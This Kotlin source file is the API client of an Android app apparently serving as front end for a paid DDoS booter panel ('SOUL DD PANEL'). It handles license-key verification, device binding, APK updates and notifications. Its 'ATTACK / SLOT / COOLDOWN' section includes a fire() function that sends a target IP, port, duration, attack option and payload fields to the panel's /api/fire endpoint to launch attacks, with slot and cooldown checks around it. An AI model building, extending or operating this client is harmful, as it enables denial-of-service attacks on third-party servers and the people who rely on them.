package com.soul.crack.service

import android.content.Context
import android.os.Build
import android.util.Log
import com.soul.crack.BuildConfig
import org.json.JSONObject

/**
 * SOUL DD PANEL v4.0 API CLIENT
 *
 * ALL requests are routed through the encrypted /api/x gateway via SecureChannel.
 * No plaintext endpoints are called from this class.
 */
object PanelApiV4 {
    private const val TAG = "PanelApiV4"

    data class ApiResult(val ok: Boolean, val code: Int, val body: JSONObject?, val error: String? = null) {
        companion object {
            fun fromSecureResponse(resp: JSONObject): ApiResult {
                val hasReason = resp.has("reason")
                val hasOk = resp.has("ok")
                val hasValid = resp.has("valid")
                val ok = when {
                    hasOk    -> resp.optBoolean("ok", false)
                    hasValid -> resp.optBoolean("valid", false)
                    else     -> !hasReason
                }
                val code = if (ok) 200 else 400
                val error = if (!ok) resp.optString("reason", null) else null
                return ApiResult(ok, code, resp, error)
            }
        }
    }

    // ═══════════════════════════════════════════════════════════
    // KEY VERIFICATION (Multi-device support)
    // ═══════════════════════════════════════════════════════════

    suspend fun verifyKey(
        context: Context,
        licenseKey: String,
        deviceId: String,
        deviceModel: String? = null
    ): ApiResult {
        return try {
            val params = JSONObject().apply {
                put("device_model", deviceModel ?: "${Build.MANUFACTURER} ${Build.MODEL}")
                put("device_brand", Build.MANUFACTURER)
                put("android_version", Build.VERSION.RELEASE)
                put("app_version", BuildConfig.VERSION_NAME)
            }
            val resp = SecureChannel.call(
                path = "/api/keys/verify",
                method = "GET",
                key = licenseKey,
                deviceId = deviceId,
                params = params
            )
            val ok = resp.optBoolean("valid", false)
            ApiResult(ok, if (ok) 200 else 400, resp, if (!ok) resp.optString("reason", null) else null)
        } catch (e: Exception) {
            Log.e(TAG, "verifyKey error: ${e.message}", e)
            ApiResult(false, 0, null, e.message)
        }
    }

    // ═══════════════════════════════════════════════════════════
    // DEVICE MANAGEMENT
    // ═══════════════════════════════════════════════════════════

    suspend fun getDevices(licenseKey: String, deviceId: String): ApiResult {
        return try {
            val resp = SecureChannel.call("/api/devices", "GET", licenseKey, deviceId)
            ApiResult.fromSecureResponse(resp)
        } catch (e: Exception) {
            Log.e(TAG, "getDevices error: ${e.message}", e)
            ApiResult(false, 0, null, e.message)
        }
    }

    /** Unbind the current device (self). */
    suspend fun unbindSelf(licenseKey: String, deviceId: String): ApiResult {
        return try {
            val resp = SecureChannel.call("/api/devices/self", "DELETE", licenseKey, deviceId)
            ApiResult.fromSecureResponse(resp)
        } catch (e: Exception) {
            Log.e(TAG, "unbindSelf error: ${e.message}", e)
            ApiResult(false, 0, null, e.message)
        }
    }

    // ═══════════════════════════════════════════════════════════
    // APK VERSION MANAGEMENT
    // ═══════════════════════════════════════════════════════════

    suspend fun getLatestVersion(licenseKey: String, deviceId: String, channel: String = "stable"): ApiResult {
        return try {
            val params = JSONObject().apply { put("channel", channel) }
            val resp = SecureChannel.call("/api/apk/latest", "GET", licenseKey, deviceId, params)
            ApiResult.fromSecureResponse(resp)
        } catch (e: Exception) {
            Log.e(TAG, "getLatestVersion error: ${e.message}", e)
            ApiResult(false, 0, null, e.message)
        }
    }

    /**
     * Returns a signed APK download URL using the download_token returned by /api/apk/latest.
     * Caller must have already called getLatestVersion to receive `download_token`.
     */
    fun buildDownloadUrl(apkFilename: String, downloadToken: String): String {
        return "https://soul-panel.onrender.com/downloads/$apkFilename?t=$downloadToken"
    }

    // ═══════════════════════════════════════════════════════════
    // REMOTE CONFIG
    // ═══════════════════════════════════════════════════════════

    suspend fun getConfig(licenseKey: String, deviceId: String): ApiResult {
        return try {
            val resp = SecureChannel.call("/api/config", "GET", licenseKey, deviceId)
            ApiResult.fromSecureResponse(resp)
        } catch (e: Exception) {
            Log.e(TAG, "getConfig error: ${e.message}", e)
            ApiResult(false, 0, null, e.message)
        }
    }

    // ═══════════════════════════════════════════════════════════
    // NOTIFICATIONS
    // ═══════════════════════════════════════════════════════════

    suspend fun getNotifications(licenseKey: String, deviceId: String): ApiResult {
        return try {
            val resp = SecureChannel.call("/api/notifications", "GET", licenseKey, deviceId)
            ApiResult.fromSecureResponse(resp)
        } catch (e: Exception) {
            Log.e(TAG, "getNotifications error: ${e.message}", e)
            ApiResult(false, 0, null, e.message)
        }
    }

    suspend fun markNotificationRead(licenseKey: String, deviceId: String, notificationId: Int): ApiResult {
        return try {
            val params = JSONObject().apply { put("id", notificationId) }
            val resp = SecureChannel.call("/api/notifications/read", "PUT", licenseKey, deviceId, params)
            ApiResult.fromSecureResponse(resp)
        } catch (e: Exception) {
            Log.e(TAG, "markNotificationRead error: ${e.message}", e)
            ApiResult(false, 0, null, e.message)
        }
    }

    // ═══════════════════════════════════════════════════════════
    // ATTACK / SLOT / COOLDOWN
    // ═══════════════════════════════════════════════════════════

    suspend fun getSlotStatus(licenseKey: String, deviceId: String): ApiResult {
        return try {
            val resp = SecureChannel.call("/api/slot/status", "GET", licenseKey, deviceId)
            ApiResult.fromSecureResponse(resp)
        } catch (e: Exception) {
            Log.e(TAG, "getSlotStatus error: ${e.message}", e)
            ApiResult(false, 0, null, e.message)
        }
    }

    suspend fun getCooldownStatus(licenseKey: String, deviceId: String): ApiResult {
        return try {
            val resp = SecureChannel.call("/api/cooldown/status", "GET", licenseKey, deviceId)
            ApiResult.fromSecureResponse(resp)
        } catch (e: Exception) {
            Log.e(TAG, "getCooldownStatus error: ${e.message}", e)
            ApiResult(false, 0, null, e.message)
        }
    }

    suspend fun fire(
        licenseKey: String,
        deviceId: String,
        ip: String,
        port: Int,
        time: Int,
        option: Int = 1,
        payload1: String = "",
        payload2: String = "",
        payload3: String = ""
    ): ApiResult {
        return try {
            val params = JSONObject().apply {
                put("ip", ip)
                put("port", port)
                put("time", time)
                put("option", option)
                put("payload1", payload1)
                put("payload2", payload2)
                put("payload3", payload3)
            }
            val resp = SecureChannel.call("/api/fire", "POST", licenseKey, deviceId, params)
            ApiResult.fromSecureResponse(resp)
        } catch (e: Exception) {
            Log.e(TAG, "fire error: ${e.message}", e)
            ApiResult(false, 0, null, e.message)
        }
    }

    suspend fun ping(licenseKey: String, deviceId: String): ApiResult {
        return try {
            val resp = SecureChannel.call("/api/ping", "GET", licenseKey, deviceId)
            ApiResult.fromSecureResponse(resp)
        } catch (e: Exception) {
            Log.e(TAG, "ping error: ${e.message}", e)
            ApiResult(false, 0, null, e.message)
        }
    }
}
